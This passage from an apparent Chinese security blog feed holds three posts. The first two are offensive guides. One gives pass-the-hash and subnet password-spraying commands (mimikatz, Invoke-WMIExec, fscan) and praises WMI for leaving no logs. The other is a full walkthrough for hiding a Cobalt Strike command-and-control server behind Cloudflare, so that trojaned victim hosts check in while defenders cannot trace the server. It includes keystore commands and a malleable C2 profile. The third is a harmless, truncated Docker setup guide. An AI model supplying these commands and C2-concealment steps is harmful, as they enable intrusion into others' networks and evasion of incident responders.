title="单IP"></a>单IP</h3><h4 id="mimikatz-hash传递"><a href="#mimikatz-hash传递" class="headerlink" title="mimikatz_hash传递"></a>mimikatz_hash传递</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sekurlsa:</span>:pth <span class="regexp">/user:Administrator /</span><span class="string">domain:</span><span class="number">973</span>fcd01b987e913cc0209c2f462a751 <span class="regexp">/ntlm:973fcd01b987e913cc0209c2f462a751 "/</span><span class="string">run:</span>mstsc.exe /restrictedadmin<span class="string">"</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654063612363-03fa4c1f-0bf8-434f-8d21-4d324ece3229.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=wGxXK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71054&status=done&style=none&taskId=u696f65af-cee5-4750-b7fa-13a0039a1c4&title=&width=960" alt="image.png"></p><h3 id="网段-1"><a href="#网段-1" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-扫描"><a href="#fscan-扫描" class="headerlink" title="fscan_扫描"></a>fscan_扫描</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -m rdp -pwd asd123=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066642326-95000608-5535-45e9-bbfc-839e1f0daca2.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=uac555c22&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85491&status=done&style=none&taskId=uf5f2f1a4-57e5-4001-93cb-8e9683a2bdf&title=&width=722" alt="image.png"></p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;WMI的全名为”Windows Management Instrumentation”。从win8后，Windows操作系统都支持WMI，WMI可以在本地或者远程管理计算机系统。<br><br>&emsp;&emsp;自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是乎攻击者转向使用WMI进行横向移动。在渗透时发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。因为这个过程不会记录日志，所以对蓝队来说大大增加了溯源的成本。对攻击者来说，被发现的可能性降低，隐蔽性提高。很多APT组织现在都喜欢使用WMI进行攻击。</p><h3 id="单IP-2"><a href="#单IP-2" class="headerlink" title="单IP"></a>单IP</h3><h4 id="WMIExec-hash传递"><a href="#WMIExec-hash传递" class="headerlink" title="WMIExec_hash传递"></a>WMIExec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066895951-c8da0db7-1b91-4f33-89e3-4fc7b086dfb4.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=51&id=ub9b3abc8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22139&status=done&style=none&taskId=uee3ff694-cdd1-45f5-9577-b21e4592706&title=&width=1063.3333333333333" alt="image.png"></h4><h3 id="网段-2"><a href="#网段-2" class="headerlink" title="网段"></a>网段</h3><h4 id="Ps1-hash传递-1"><a href="#Ps1-hash传递-1" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667" alt="image.png"></h2><h3 id="超级弱口令检查工具-SMB-RDP"><a href="#超级弱口令检查工具-SMB-RDP" class="headerlink" title="超级弱口令检查工具 SMB&#x2F;RDP"></a>超级弱口令检查工具 SMB&#x2F;RDP</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666" alt="image.png"></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br><a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener">https://github.com/shadow1ng/fscan</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;smb&quot;&gt;&lt;a href=&quot;#smb&quot; class=&quot;headerlink&quot; title=&quot;smb&quot;&gt;&lt;/a&gt;smb&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&amp;#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、&lt;br&gt;检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名&amp;#x2F;密码组合才能查看内容或与内容交互SMB共享。&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。&lt;/p&gt;</summary>
    
    
    
    
    <category term="hash传递" scheme="https://chenzidu.github.io/tags/hash%E4%BC%A0%E9%80%92/"/>
    
  </entry>
  
  <entry>
    <title>cobaltstrike域前置</title>
    <link href="https://chenzidu.github.io/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/"/>
    <id>https://chenzidu.github.io/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/</id>
    <published>2022-05-15T01:20:47.000Z</published>
    <updated>2024-03-11T07:47:58.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>CS的流量特征是很明显的，如果蓝队成员在流量中发现了相关特征那么基本也就宣告了个权限的丢失，而且还有可能被疏远反制。正因为CS的流量的特征太明显，所以需要对CS进行一些修改和对VPS的地址进行保护，尽可以降低被发现后造成权限丢失和被溯源反制的事情发生概率，加大蓝队的疏远难度。<br>主要思路</p><a id="more"></a><h2 id="主要思路与配置"><a href="#主要思路与配置" class="headerlink" title="主要思路与配置"></a>主要思路与配置</h2><p>● 免费tk域名<br>● cloudflare<br>● 云服务器<br>通过 匿名域名-&gt;CDN-&gt;VPS，在这个过程中来隐藏我们的真实IP，达到套了CDN，找不到服务器真实ip的情况。</p><h3 id="达到的效果"><a href="#达到的效果" class="headerlink" title="达到的效果"></a>达到的效果</h3><p>● 受害者主机运行木马—–&gt;CDN—-&gt;CS服务器收到上线<br>● CS服务器执行命令—–&gt;CDN—–&gt;受害者主机执行命令</p><h2 id="申请域名"><a href="#申请域名" class="headerlink" title="申请域名"></a>申请域名</h2><p>&nbsp;&nbsp;我们选用<a href="https://www.freenom.com/zh/index.html?lang=zh" target="_blank" rel="noopener">freenom.com</a>去申请一个免费的域名。</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/1.png" class=""><p>&nbsp;&nbsp;这边建议直接输出域名包括后缀，否则可能显示不可用，例如：xxx.tk</p><p>成功注册后，先去弄一个cloudflare账号，将注册的域名添加进去。</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/2.png" class=""><h2 id="关联Cloudflare"><a href="#关联Cloudflare" class="headerlink" title="关联Cloudflare"></a>关联Cloudflare</h2><p>&nbsp;&nbsp;将freenom中申请的域名，在管理界面中DNS解析改cloudflare提供的DNS</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/3.png" class=""><p>&nbsp;&nbsp;在DNS的子模块中找到属于你的DNS服务器，填入freenom管理台中Management tools-&gt;Nameservers</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/4.png" class=""><p>&nbsp;&nbsp;选择第二个，填入你的Cloudflare DNS</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/5.png" class=""><h2 id="Cloudflare配置"><a href="#Cloudflare配置" class="headerlink" title="Cloudflare配置"></a>Cloudflare配置</h2><h3 id="缓存设置"><a href="#缓存设置" class="headerlink" title="缓存设置"></a>缓存设置</h3><p>接下来在Cloudflare中进行设置，首先在概述-&gt;快速设置</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/6.png" class=""><p>这边都要关闭，设置完之后看一下Summary，是不是都关闭了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Automatic HTTPS Rewrites: <span class="keyword">OFF</span></span><br><span class="line"><span class="keyword">Always</span> use HTTPS: <span class="keyword">OFF</span></span><br><span class="line">Auto Minify: <span class="keyword">NONE</span></span><br><span class="line">Brotli: <span class="keyword">OFF</span></span><br></pre></td></tr></table></figure><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/7.png" class=""><p>&nbsp;&nbsp;找到Caching -&gt; Configuration在其中开启Always Online以及Development Mode,经过实验，配置好之后Development Mode模式不用开启也可以，需要在规则上面配置</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/8.png" class=""><h3 id="规则配置"><a href="#规则配置" class="headerlink" title="规则配置"></a>规则配置</h3><p>在Rules-&gt;Page Rules 页面设置，什么路径走代理，什么路径不走代理。个人测试配置完后可以不开Development Mode</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/Rules.png" class=""><h2 id="CS配置"><a href="#CS配置" class="headerlink" title="CS配置"></a>CS配置</h2><h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>在SSL&#x2F;TLS -&gt;Overview 修改为Full即可</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/9.png" class=""><p>再到Origin Server页面下创建证书</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/10.png" class=""><p>保存我们的pem和key文件（命名为xxx.tk.pem、xxx.tk.key），在服务器cs同文件夹下放置，并且如下执行命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">openssl</span> <span class="selector-tag">pkcs12</span> <span class="selector-tag">-export</span> <span class="selector-tag">-in</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.pem</span> <span class="selector-tag">-inkey</span> <span class="selector-tag">update</span><span class="selector-class">.xxx</span><span class="selector-class">.tk</span><span class="selector-class">.key</span> <span class="selector-tag">-out</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.p12</span> <span class="selector-tag">-name</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span> <span class="selector-tag">-passout</span> <span class="selector-tag">pass</span><span class="selector-pseudo">:123456</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">keytool</span> <span class="selector-tag">-importkeystore</span> <span class="selector-tag">-deststorepass</span> 123456 <span class="selector-tag">-destkeypass</span> 123456 <span class="selector-tag">-destkeystore</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.store</span> <span class="selector-tag">-srckeystore</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.p12</span> <span class="selector-tag">-srcstoretype</span> <span class="selector-tag">PKCS12</span> <span class="selector-tag">-srcstorepass</span> 123456 <span class="selector-tag">-alias</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span></span><br></pre></td></tr></table></figure><p>最后会生成一个xxx.tk.store文件，上面的xxx.tk就是你的申请的域名。其中文件有个坑，cs的store的默认密码是123456所以我这边都保持一致免得出错。</p><h3 id="profile编写"><a href="#profile编写" class="headerlink" title="profile编写"></a>profile编写</h3><p>在cs同目录下编写文件cs.profile，这边写个最简单的。将里面xxx.tk替换成你的域名即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="builtin-name">set</span> keystore <span class="string">"xxx.tk.store.store"</span>;</span><br><span class="line">    <span class="builtin-name">set</span> password <span class="string">"123456"</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x86 <span class="string">"/api/1"</span>;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x64 <span class="string">"/api/2"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;&#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-<span class="builtin-name">get</span> &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">"/api/3"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            header <span class="string">"Cookie"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">"/api/4"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;</span><br><span class="line">        id &#123;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写好后利用CS自带的c2lint来测试可用性，同目录下执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint <span class="keyword">cs</span>.<span class="keyword">profile</span></span><br></pre></td></tr></table></figure><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/11.png" class=""><h3 id="修改证书"><a href="#修改证书" class="headerlink" title="修改证书"></a>修改证书</h3><p>&nbsp;&nbsp;修改自带的cobaltStrike.store证书，先删除cobaltStrike.store文件，后续编写teamserver文件,将原本在这个位置的那句话删掉修改为如下内容</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass <span class="number">123456</span> -keypass <span class="number">123456</span> -genkey -keyalg RSA -alias http:<span class="comment">//google.com -dname "CN=US, OU=google.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN"</span></span><br></pre></td></tr></table></figure><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/12.png" class=""><p>&nbsp;&nbsp;修改完后，下次运行teamserver文件时会自动生成新的cobaltStrike.store文件</p><h3 id="cs运行"><a href="#cs运行" class="headerlink" title="cs运行"></a>cs运行</h3><p>&nbsp;&nbsp;配置完规则后，运行CS，加载profile文件</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver <span class="symbol">x</span>.<span class="symbol">x</span>.<span class="symbol">x</span>.<span class="symbol">x</span> ****** cs.profile</span><br></pre></td></tr></table></figure><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/14.png" class=""><p>&nbsp;&nbsp;new一个新的Listener<br><br>&nbsp;&nbsp;这边需要注意Cloudflare只支持监听以下端口：<br></p><ul><li>HTTP端口：80,8080,8880,2052,2082,2086,2095</li><li>HTTPs端口：443,2053,2083,2087,2096,8443</li><li>注意：如果VPS是国内云主机，且注册的免费域名没有备案，则不能使用80、8080、443、8443端口提供服务，否则会被拦截提示备案才能访问。</li></ul><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/15.png" class=""><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>直接访问显示不存在 404，可以正常上线</p><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/16.png" class=""><img src="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/17.png" class=""><h3 id="profile方面"><a href="#profile方面" class="headerlink" title="profile方面"></a>profile方面</h3><p>profile方面复杂的可以用github上面的收集了几个好用的Malleable-C2，还有挺多的，可以在github上搜搜</p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">Malleable-C2-Profiles</a><br><br><a href="https://github.com/threatexpress/malleable-c2" target="_blank" rel="noopener">malleable-c2</a><br><br><a href="https://github.com/FortyNorthSecurity/C2concealer" target="_blank" rel="noopener">C2concealer</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;CS的流量特征是很明显的，如果蓝队成员在流量中发现了相关特征那么基本也就宣告了个权限的丢失，而且还有可能被疏远反制。正因为CS的流量的特征太明显，所以需要对CS进行一些修改和对VPS的地址进行保护，尽可以降低被发现后造成权限丢失和被溯源反制的事情发生概率，加大蓝队的疏远难度。&lt;br&gt;主要思路&lt;/p&gt;</summary>
    
    
    
    <category term="域前置" scheme="https://chenzidu.github.io/categories/%E5%9F%9F%E5%89%8D%E7%BD%AE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>docker搭建</title>
    <link href="https://chenzidu.github.io/2022/04/17/docker%E6%90%AD%E5%BB%BA/"/>
    <id>https://chenzidu.github.io/2022/04/17/docker%E6%90%AD%E5%BB%BA/</id>
    <published>2022-04-17T14:52:40.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p><a name="MRO41"></a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a name="JGWFo"></a></p><h3 id="本地为centos8（已停止维护）"><a href="#本地为centos8（已停止维护）" class="headerlink" title="本地为centos8（已停止维护）"></a>本地为centos8（已停止维护）</h3><p><a name="DpgRB"></a></p><h3 id="1、换华为源（阿里云源也停止维护了）"><a href="#1、换华为源（阿里云源也停止维护了）" class="headerlink" title="1、换华为源（阿里云源也停止维护了）"></a>1、换华为源（阿里云源也停止维护了）</h3><a id="more"></a><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">下载新源</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-<span class="module-access"><span class="module"><span class="identifier">Base</span>.</span></span>repo https:<span class="comment">//repo.huaweicloud.com/repository/conf/CentOS-8-reg.repo</span></span><br><span class="line"></span><br><span class="line">AppStream源，移除可直接删除或者，改为备份文件</span><br><span class="line">mv CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">AppStream</span>.</span></span>repo  CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">AppStream</span>.</span></span>repo.bak</span><br><span class="line"></span><br><span class="line">BaseOS源同样，移除可直接删除或者，改为备份文件</span><br><span class="line">mv CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">BaseOS</span>.</span></span>repo CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">BaseOS</span>.</span></span>repo.bak</span><br><span class="line"></span><br><span class="line">清除原有源缓存并生成新源缓存</span><br><span class="line">yum clean all<span class="operator"> &amp;&amp; </span>yum makecache</span><br></pre></td></tr></table></figure><p><a name="gM6Zw"></a></p><h3 id="2、yum包更新（可以忽略）"><a href="#2、yum包更新（可以忽略）" class="headerlink" title="2、yum包更新（可以忽略）"></a>2、yum包更新（可以忽略）</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">yum update</span></span><br></pre></td></tr></table></figure><p><a name="Ej3n5"></a></p><h3 id="3、安装需要的软件包，-yum-util-提供yum-config-manager功能，另外两个是devicemapper驱动依赖的"><a href="#3、安装需要的软件包，-yum-util-提供yum-config-manager功能，另外两个是devicemapper驱动依赖的" class="headerlink" title="3、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的"></a>3、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</h3><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -<span class="symbol">y</span> yum-utils device-mapper-<span class="symbol">persistent</span>-data lvm2</span><br></pre></td></tr></table></figure><p><a name="zNViO"></a></p><h3 id="4、配置阿里云的docker仓库"><a href="#4、配置阿里云的docker仓库" class="headerlink" title="4、配置阿里云的docker仓库"></a>4、配置阿里云的docker仓库</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">dnf install http<span class="variable">s:</span>//mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/<span class="number">7</span>/x86_64/stable/Packages/containerd.io-<span class="number">1.2</span>.<span class="number">13</span>-<span class="number">3.1</span>.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">dnf install docker-<span class="keyword">ce</span></span><br></pre></td></tr></table></figure><p><a name="INkDZ"></a></p><h3 id="5、下载docker-ce的repo"><a href="#5、下载docker-ce的repo" class="headerlink" title="5、下载docker-ce的repo"></a>5、下载docker-ce的repo</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo -<span class="keyword">o</span> /etc/yum.repos.d/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">dnf -<span class="keyword">y</span>  install docker-<span class="keyword">ce</span>  docker-<span class="keyword">ce</span>-cli --nobest</span><br></pre></td></tr></table></figure><p>6、启动docker</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> docker</span><br></pre></td></tr></table></figure><p>7、安装docker-comper</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> docker-compose</span><br></pre></td></tr></table></figure><p><a name="ELKcB"></a></p><h2 id="操作基本镜像"><a href="#操作基本镜像" class="headerlink" title="操作基本镜像"></a>操作基本镜像</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">拉取，例如ubuntu</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">pull ubuntu</span></span><br><span class="line"></span><br><span class="line"><span class="attr">查看当前存在的镜像</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">images</span></span><br><span class="line"></span><br><span class="line"><span class="attr">运行镜像</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">run &lt;IMAGE ID&gt;    镜像ID不一定要全部，部分也行</span></span><br><span class="line"></span><br><span class="line"><span class="attr">docker</span> <span class="string">ps -a 查看运行状态</span></span><br></pre></td></tr></table></figure><p><a name="rPju1"></a></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose安装</span><br><span class="line">sudo curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)"</span> -o <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>docker-compose</span><br><span 